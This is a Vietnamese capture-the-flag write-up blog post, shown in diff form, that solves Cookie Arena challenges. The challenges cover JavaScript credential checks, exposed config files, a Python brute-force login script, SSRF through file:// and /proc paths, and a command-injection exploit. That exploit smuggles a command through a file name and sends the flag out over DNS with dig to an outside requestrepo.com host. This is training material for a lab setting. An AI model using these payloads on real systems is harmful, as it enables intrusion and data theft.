+<span class="kd">function</span> <span class="nx">verifyUsername</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">cookiehanhoan</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 2.js</span>
+<span class="kd">function</span> <span class="nx">reverseString</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">str</span> <span class="o">===</span> <span class="dl">''</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="dl">''</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nx">reverseString</span><span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="nx">str</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// 3.js</span>
+<span class="kd">function</span> <span class="nx">verifyPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">reverseString</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">dr0Wss@p3rucreSr3pus</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 4.js</span>
+<span class="kd">function</span> <span class="nx">verifyRole</span><span class="p">(</span><span class="nx">role</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">209</span> <span class="o">&amp;&amp;</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">9</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">3</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">10578</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">27</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Hàm <code class="language-plaintext highlighter-rouge">verifyUsername</code> thì chỉ kiểm tra <code class="language-plaintext highlighter-rouge">username</code> có phải là <code class="language-plaintext highlighter-rouge">cookiehanhoan</code> hay không.</p>
+
+<p>Còn hàm <code class="language-plaintext highlighter-rouge">reverseString</code> thì dùng để reverse string (Ví dụ: ‘abc’ -&gt; ‘cba’).</p>
+
+<p>Hàm <code class="language-plaintext highlighter-rouge">verifyPassword</code> thì kiểm tra xem chuỗi password chúng ta nhập vào có phải là đảo ngược của <code class="language-plaintext highlighter-rouge">dr0Wss@p3rucreSr3pus</code> không, tức là password có bằng <code class="language-plaintext highlighter-rouge">sup3rSercur3p@ssW0rd</code> không.</p>
+
+<p>Cuối cùng là hàm <code class="language-plaintext highlighter-rouge">verifyRole</code>. Chữ cái đầu tiên của role có giá trị ASCII là 64 - chính là kí tự @. Tiếp theo, chúng ta tìm 2 kí tự tiếp theo có tổng và hiệu theo bảng mã ASCII là 209 và 9 - chính là 100 (d) và 109 (m). Tiếp theo khi nối giá trị ASCII của 2 kí tự tiếp theo thì sẽ ra giá trị <code class="language-plaintext highlighter-rouge">'10578'</code> và hiệu 2 giá trị đó bằng 27 - 105 (i) và (N).</p>
+
+<p>Kết nối những điều trên, ta chỉ cần nhập <code class="language-plaintext highlighter-rouge">username = 'cookiehanhoan'</code>, <code class="language-plaintext highlighter-rouge">password = 'sup3rSercur3p@ssW0rd'</code> và <code class="language-plaintext highlighter-rouge">role</code> là xâu bất kì có 5 kí tự đầu là <code class="language-plaintext highlighter-rouge">@dmiN</code> - ví dụ như <code class="language-plaintext highlighter-rouge">@dmiNhehe</code> hay <code class="language-plaintext highlighter-rouge">@dmiN</code> đều được. Sau đó bấm submit thôi. =))</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{JAV-ascript_F*ck}</code></p>
+
+<h1 id="web-exploitation">WEB EXPLOITATION</h1>
+
+<h2 id="misconfiguration">Misconfiguration</h2>
+<blockquote>
+  <p>Chẳng biết vô tình hay cố ý, Gà mắc phải một sai lầm không đáng có trong việc thiết lập cấu hình Web Server.</p>
+
+  <p>Từ một lỗ hổng nhỏ tí xíu, Mèo Yang Hồ sẽ tận dụng mọi trí tưởng tượng và kĩ thuật để thâm nhập được sâu hơn.</p>
+
+  <p>http://chal16.web.letspentest.org/</p>
+</blockquote>
+
+<p>Khi viết writeup bài này thì web đã sập nên không có ảnh minh hoạ được 😥</p>
+
+<p>Khi đọc đề thì mình nghĩ tới việc tìm các file <code class="language-plaintext highlighter-rouge">config</code>. Mình chỉ biết <code class="language-plaintext highlighter-rouge">/.htaccess</code> của Apache thôi :v. Rồi mình dùng dirsearch thì có thêm <code class="language-plaintext highlighter-rouge">/web.config</code>.</p>
+
+<p>Flag có 3 phần:</p>
+<ul>
+  <li>Part 1: <code class="language-plaintext highlighter-rouge">http://chal16.web.letspentest.org/.htaccess</code></li>
+  <li>Part 2: <code class="language-plaintext highlighter-rouge">http://chal16.web.letspentest.org/web.config</code></li>
+  <li>Part 3: Ở trong <code class="language-plaintext highlighter-rouge">/web.config</code> thì có đường dẫn để tải một file <code class="language-plaintext highlighter-rouge">.bak</code>, tải về dùng lệnh <code class="language-plaintext highlighter-rouge">file</code> thì biết nó là file zip. Mình đổi phần mở rộng thành <code class="language-plaintext highlighter-rouge">.zip</code>, giải nén ra và nhận part 3.</li>
+</ul>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{1b283f0725d536a0f217d89caca7b183}</code></p>
+
+<h2 id="gatling-gun">Gatling gun</h2>
+<blockquote>
+  <p>Với chiếc Gatling gun mạnh mẽ trong tay, Mèo Yang Hồ có thể vượt qua bất kì cánh cửa bảo mật nào. Nhưng thật buồn cười là trong tay hắn lại không có một viên đạn nào.</p>
+
+  <p>Nếu bạn muốn nghịch súng với Mèo thì hãy đi nhặt đạn ở trong Github của Cookie Hân Hoan nhé.</p>
+
+  <p>http://chal9.web.letspentest.org/</p>
+</blockquote>
+
+<p>Vừa bấm vào link, mình nhận được một cái giao diện như này, cùng với mô tả trong đề là “gatling gun”, “bắn súng” và lên github để “nhặt đạn”, mình đoán đây chính là một chall về bruteforce login:</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/gatling_gun_1.png" alt="" /></p>
+
+<p>Mình mở github của Cookien Hân Hoan lên thì thấy một số file giống như là account để đăng nhập:</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/gatling_gun_2.png" alt="" /></p>
+
+<p>Đến đây thì có thể sử dụng BurpSuite để brute nhưng không, <code class="language-plaintext highlighter-rouge">người thành công có lối đi riêng ✨</code></p>
+
+<p>Mình download các file đó về và mình tự chế một khẩu gatling gun bằng kĩ năng cơ khí <del>vjp pro</del> của mình. Sau một lúc mình đã có được một khẩu galting gun khá là hạt dẻ:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s">'http://chal9.web.letspentest.org/login'</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'ip.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">ips</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'userLame.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">users</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'pa$$w0rd.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">passwds</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">users</span><span class="p">)):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">passwds</span><span class="p">)):</span>
+        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ips</span><span class="p">)):</span>
+            <span class="n">login</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s">'password'</span><span class="p">:</span> <span class="n">passwds</span><span class="p">[</span><span class="n">j</span><span class="p">],</span>
+                <span class="s">'username'</span><span class="p">:</span> <span class="n">users</span><span class="p">[</span><span class="n">i</span><span class="p">],</span>
+                <span class="s">'ip'</span><span class="p">:</span> <span class="n">ips</span><span class="p">[</span><span class="n">k</span><span class="p">]</span>
+            <span class="p">}</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">login</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">login</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s">'FLAG{Not_True}'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Và việc còn lại là sấy thôi, hình ảnh gấu đang dùng khẩu súng sida của mình:</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/gatling_gun_3.png" alt="" /></p>
+
+<p>Sau một hồi bruteforce thì mình đã thấy được flag:</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/gatling_gun_4.png" alt="" /></p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">FLAG{e6c068faf9241fe9d1f2000516718377}</code></p>
+
+<h2 id="paparazzi">Paparazzi</h2>
+<blockquote>
+  <p>Đây là cánh cửa thần kì giúp Gà vượt qua mọi rào cản, biên giới. Mèo Yang Hồ khao khát có được thứ bảo bối này, nên ngày đêm ngồi tìm kiếm lỗ hổng. Bạn muốn giúp Mèo một tay?</p>
+
+  <p>http://chal8.web.letspentest.org/</p>
+</blockquote>
+
+<p>Sau khi dạo một vòng, mình nhận thấy ở đây chỉ có nhập vào URL nên mình đoán đây rất có thể là một bài SSRF.</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_1.png" alt="" /></p>
+
+<p>Sau khi nhập thử <code class="language-plaintext highlighter-rouge">file:///</code> vào mình nhận được json có chứa tên một file png:</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_2.png" alt="" /></p>
+
+<p>Mình tiếp tục tìm trong source thì thấy một đoạn js có vẻ khả nghi:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">getHistory</span><span class="p">()</span>
+<span class="p">{</span>	
+	<span class="nx">src</span> <span class="o">=</span> <span class="p">[]</span>
+	<span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/get_all_screenshot</span><span class="dl">"</span><span class="p">);</span>
+	<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
+	<span class="kd">let</span> <span class="nx">tab</span> <span class="o">=</span> <span class="s2">`&lt;h1&gt;History&lt;/h1&gt;`</span><span class="p">;</span>
+	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span>
+	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">r</span> <span class="k">of</span> <span class="nx">data</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`&lt;img src="</span><span class="p">${</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span><span class="p">}</span><span class="s2">/get_screenshot?file=</span><span class="p">${</span><span class="nx">r</span><span class="p">}</span><span class="s2">"&gt;`</span><span class="p">);</span>
+		<span class="nx">tab</span> <span class="o">+=</span> <span class="s2">`&lt;img src="</span><span class="p">${</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span><span class="p">}</span><span class="s2">/get_screenshot?file=</span><span class="p">${</span><span class="nx">r</span><span class="p">}</span><span class="s2">"&gt;`</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">history</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">tab</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Ở đây <code class="language-plaintext highlighter-rouge">get_screenshot?file=</code> có vẻ là chỗ để xem file .png ở trên. Boom, và mình đã có screenshot của <code class="language-plaintext highlighter-rouge">/</code></p>
+
+<pre><code class="language-http://chal8.web.letspentest.org/get_screenshot">
+![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_3.png)
+
+Sau khi thử tìm lần lượt trong các thư mục đều không thấy flag, riêng `/src` lại bị `url invalid`, mình cũng thử với các URL khác có chứa từ `src` thì nhận ra là từ khoá này đã bị block.
+
+![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_4.png)
+
+Để bypass cái này và truy cập vào `src` này mình dùng thư mục `/proc/[pid]/cwd`:
+
+![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_5.png)
+
+![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_6.png)
+
+Mình thử với `pid = 1` thì thấy một thư mục có khả năng cao là chứa flag:
+
+![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_7.png)
+
+Tiếp tục đi vào trong thì mình tìm được file `flag.txt`:
+
+![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_8.png)
+
+Screenshot và có flag =)):
+
+![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_9.png)
+
+Flag: `FLAG{abc725173fa1828ea019503669b4eecd}`
+
+## A tiny hole 
+&gt; Lợi dụng thời điểm hệ thống giám sát ngủ say và mệt mỏi sau cuộc tấn công HTTP Flood. Mèo Yang Hồ đột nhập vào máy chủ Challenge của Cookie Arena để cài đặt một Web Shell để đánh cắp Flag. Tuy nhiên máy chủ bị hạn chế một số kết nối ra ngoài Internet, nên nó không thể download, lưu và thực thi mã độc hại được. Còn cửa nào sáng không?
+&gt;
+&gt; http://chal17.web.letspentest.org/
+
+Đề cho ta file app.py chạy ở phía server, đọc sơ qua source code thì mình có thể dễ dàng đoán được server sẽ thực hiện việc download script từ url mình nhập vào và thực thi nó. Sau khi test thử một vài đường link thì mình nhận ra không thể kết nối ra bên ngoài. 
+
+Muốn chạy được script thì mình phải bypass qua được đoạn check ở hàm `download_script` trước:
+
+```python
+def download_script(script_path, command_log, url):
+	try:
+		script_link = url
+	except:
+		return "missing url"
+	r = requests.Session()
+	r.mount('file://', FileAdapter())
+	try:
+		result = r.get(script_link)
+	except:
+		return "Oh no! Lost internet"
+	with open(script_path, 'wb') as f:
+		f.write(result.content)
+		run_script(script_path, command_log)
+</code></pre>
+
+<p>Để ý thấy dòng <code class="language-plaintext highlighter-rouge">r.mount('file://', FileAdapter())</code>, mình thử nhập url là <code class="language-plaintext highlighter-rouge">file:///etc/passwd</code> thì bypass được hàm này.</p>
+
+<p>Tiếp đến là hàm <code class="language-plaintext highlighter-rouge">run_script</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">):</span>
+	<span class="n">lf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">command_log</span><span class="p">,</span> <span class="s">'wb+'</span><span class="p">)</span>
+	<span class="n">command</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">'bash'</span><span class="p">,</span> <span class="n">script_path</span><span class="p">],</span> <span class="n">stderr</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+	<span class="k">return</span> <span class="s">"Run successfully"</span>
+</code></pre></div></div>
+
+<p>Đoạn code trên sẽ chạy lệnh <code class="language-plaintext highlighter-rouge">bash</code> với file <code class="language-plaintext highlighter-rouge">script_path</code> được truyền vào, sau đó cả output lẫn error đều được ghi vào file <code class="language-plaintext highlighter-rouge">command_log</code></p>
+
+<p>Nội dung của file <code class="language-plaintext highlighter-rouge">script_path</code> được lấy từ url mình cung cấp nhưng do không thể connect ra bên ngoài nên việc chèn reverse shell vào đây là không khả thi.</p>
+
+<p>Mình control được 2 param đó là <code class="language-plaintext highlighter-rouge">script_path</code> và <code class="language-plaintext highlighter-rouge">command_log</code> từ đó mình có thể lợi dụng chính lệnh <code class="language-plaintext highlighter-rouge">bash</code> để thực thi lệnh tuỳ ý.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo </span>kemdau <span class="o">&gt;</span> <span class="s1">'date;
+</span><span class="gp">$</span><span class="w"> </span><span class="s1">bash '</span><span class="nb">date</span><span class="p">;</span><span class="s1">' 2&gt; command_log
+</span><span class="gp">$</span><span class="w"> </span><span class="s1">cat command_log
+</span><span class="gp">date;</span><span class="s1">: line 1: kemdau: command not found
+</span><span class="gp">$</span><span class="w"> </span><span class="s1">bash command_log
+</span><span class="go">Thu Nov  4 02:48:02 PM +07 2021
+</span></code></pre></div></div>
+
+<p>Ở đây mình dùng <code class="language-plaintext highlighter-rouge">2&gt;</code> để chuyển hướng <code class="language-plaintext highlighter-rouge">stderr</code> vào file như hàm <code class="language-plaintext highlighter-rouge">run_script</code> ở trên.</p>
+
+<p>Ý tưởng của mình là tạo 1 file với tên là câu lệnh cần chạy rồi lợi dụng ghi error của lệnh <code class="language-plaintext highlighter-rouge">bash</code> vào file <code class="language-plaintext highlighter-rouge">command_log</code> và sau đó <code class="language-plaintext highlighter-rouge">bash command_log</code> là lệnh sẽ được thực thi. Đau não chưa, khúc này khoan đã đọc tiếp mà ngồi ngẫm lại rồi tự thử trên máy mình để hiểu nha, mình biết bạn bị đau nửa đầu rồi =))))</p>
+
+<p>Vậy còn lệnh <code class="language-plaintext highlighter-rouge">cat /flag.txt</code> thì sao? Tên file trong linux thì làm gì đặt được dấu <code class="language-plaintext highlighter-rouge">/</code>? Có rất nhiều cách để bypass, mình chọn encode sang <code class="language-plaintext highlighter-rouge">base64</code>.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"cat /flag.txt"</span> | <span class="nb">base64</span>
+<span class="go">Y2F0IC9mbGFnLnR4dAo=
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo </span><span class="nv">Y2F0IC9mbGFnLnR4dAo</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
+<span class="go">cat: /flag.txt: No such file or directory
+</span></code></pre></div></div>
+
+<p>Nhưng không có internet thì làm sao mà gửi flag về? Với những chall kiểu như này mình sẽ thử dùng DNS để bypass.</p>
+
+<p>Mình sử dụng lệnh <code class="language-plaintext highlighter-rouge">dig</code> để query và <a href="requestrepo.com">requestrepo.com</a> để hứng DNS.</p>
+
+<p>Và đây là payload của mình:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>dig <span class="si">$(</span><span class="nb">echo </span><span class="nv">Y2F0IC9mbGFnLnR4dAo</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash<span class="si">)</span>.jrl0lymn.requestrepo.com
+</code></pre></div></div>
+
+<p>Còn đây là script của mình:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s">'http://chal17.web.letspentest.org/'</span>
+
+<span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="nb">dir</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">log</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">'script_dir'</span><span class="p">:</span> <span class="nb">dir</span><span class="p">,</span>
+        <span class="s">'script_name'</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>
+        <span class="s">'script_url'</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
+        <span class="s">'command_log_file'</span><span class="p">:</span> <span class="n">log</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">'/runScript'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">randstr</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">10</span><span class="p">))</span>
+
+<span class="n">core_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'cat /flag.txt'</span>
+<span class="n">core_payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">core_payload</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="n">dirname</span> <span class="o">=</span> <span class="n">randstr</span><span class="p">()</span> <span class="c1"># Tên file tùm lum z để phá server chơi nè =)))
+</span>
+<span class="n">send_payload</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">dig $(echo </span><span class="si">{</span><span class="n">core_payload</span><span class="si">}</span><span class="s"> | base64 -d | bash).jrl0lymn.requestrepo.com;'</span><span class="p">,</span> <span class="s">'file:///etc/hosts'</span><span class="p">,</span> <span class="s">'log'</span><span class="p">)</span>
+<span class="n">send_payload</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="s">'bruh'</span><span class="p">,</span> <span class="s">'file:///src/logs/log.txt'</span><span class="p">,</span> <span class="s">'log1'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Hứng DNS:</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/a_tiny_hole_1.png" alt="" /></p>
+
+<p>Phải là think out of the traditional connections chứ nhể, hê =))))</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{CookieWarrior_Please_Think_Out_Of_The_Box}</code></p>
+
+<h1 id="lời-kết">Lời kết</h1>
+
+<p>Oce, mình định chơi trội làm cả 40 bài nhưng quỹ thời gian và sự kiên nhẫn không cho phép, vậy mình xin phép chỉ viết những bài mình cảm thấy khó và thử thách, dù sao thì cảm ơn đã đọc bài của mình. Cảm ơn BTC đã tổ chức cuộc thi khá vui, nhưng mình nghĩ nếu có Cookie Arena 2 thì nên thêm mảng Pwn/Re và tăng độ khó cho các challenge, và bớt guessing lại 👀</p>
+
+<p>Gud bai see you again, Gấu quay về hang với con Sâu ngủ đây =))</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2021/09/27/downunderctf-2021.html">
+            DownUnderCTF2021 Writeups
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/06/07/book-manager-hcmus-writeup.html">
+            Book manager writeup [HCMUSCTF2021 Final]
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/05/23/HCMUS-CTF-2021-writeup.html">
+            HCMUS CTF 2021 writeup
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/beginner/" class="set-1">beginner</a> <a href="/tag/cookiehanhoan/" class="set-1">cookiehanhoan</a> <a href="/tag/crypto/" class="set-1">crypto</a> <a href="/tag/forensic/" class="set-1">forensic</a> <a href="/tag/heap-exploit/" class="set-2">heap exploit</a> <a href="/tag/introduction/" class="set-1">introduction</a> <a href="/tag/network/" class="set-1">network</a> <a href="/tag/picoctf2019/" class="set-1">picoCTF2019</a> <a href="/tag/privacy/" class="set-2">privacy</a> <a href="/tag/pwn/" class="set-5">pwn</a> <a href="/tag/pwnable.tw/" class="set-2">pwnable.tw</a> <a href="/tag/tutorial/" class="set-3">tutorial</a> <a href="/tag/web/" class="set-1">web</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
